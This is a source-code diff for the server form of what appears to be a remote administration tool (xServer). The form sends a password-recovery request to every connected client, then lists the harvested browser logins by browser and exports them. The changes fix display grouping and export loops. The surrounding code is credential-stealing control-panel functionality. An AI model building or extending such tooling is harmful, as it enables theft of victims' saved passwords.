@@ -45,7 +45,7 @@ namespace xServer.Forms
             foreach (Client client in ConnectedClients)
             {
                 // Send request packet
-                new Core.Packets.ServerPackets.PasswordRequest().Execute(client);
+                new Core.Packets.ServerPackets.RecoverPassRequest().Execute(client);
             }
         }
 
@@ -65,14 +65,16 @@ namespace xServer.Forms
                     // No group exists for the browser in question
 
                     lvg = new ListViewGroup();
+
+                    lvi.Group = lvg;
                     // Space in the browser name will not be allowed in the property
                     lvg.Name = login.Browser.Replace(" ", "");
                     lvg.Header = login.Browser;
-                    lvg.Items.Add(lvi);
 
                     this.Invoke(new MethodInvoker(delegate
                     {
                        lstPasswords.Groups.Add(lvg);
+                       lstPasswords.Items.Add(lvi);
                     }));
                 }
                 else
@@ -82,11 +84,12 @@ namespace xServer.Forms
                     // Get the group index so we can quickly set it after we've completed operations
                     int groupIndex = lstPasswords.Groups.IndexOf(lvg);
 
-                    lvg.Items.Add(lvi);
+                    lvi.Group = lvg;
 
                     this.Invoke(new MethodInvoker(delegate
                     {
                         lstPasswords.Groups[groupIndex] = lvg;
+                        lstPasswords.Items.Add(lvi);
                     }));
                 }
             }
@@ -112,10 +115,21 @@ namespace xServer.Forms
             StringBuilder sb = new StringBuilder();
             string format = txtFormat.Text;
 
-            foreach (ListViewItem lvi in (selected ? lstPasswords.SelectedItems.Cast<IEnumerable<ListViewItem>>() : lstPasswords.Items.Cast<IEnumerable<ListViewItem>>()))
+            if (selected)
             {
-                sb.Append(ConvertToFormat(format, (LoginInfo)lvi.Tag));
+                foreach (ListViewItem lvi in lstPasswords.SelectedItems)
+                {
+                    sb.Append(ConvertToFormat(format, (LoginInfo)lvi.Tag));
+                }
             }
+            else
+            {
+                foreach (ListViewItem lvi in lstPasswords.Items)
+                {
+                    sb.Append(ConvertToFormat(format, (LoginInfo)lvi.Tag));
+                }
+            }
+          
             return sb;
         }
 
